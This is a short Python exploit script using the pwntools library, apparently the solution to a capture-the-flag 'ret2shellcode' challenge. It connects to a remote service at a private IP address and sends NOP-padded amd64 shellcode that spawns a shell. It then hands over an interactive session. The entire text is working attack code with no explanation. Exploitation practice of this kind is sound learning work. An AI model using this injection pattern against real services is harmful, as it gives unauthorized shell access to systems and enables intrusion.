from pwn import *
context(arch="amd64",os="linux",log_level="debug")
#s=process("../dist/ret2shellcode")
s=remote("192.168.3.253",51003)
#pause()
s.sendafter(b"code:\n",asm(shellcraft.sh()).rjust(0x100,b"\x90"))
s.interactive()
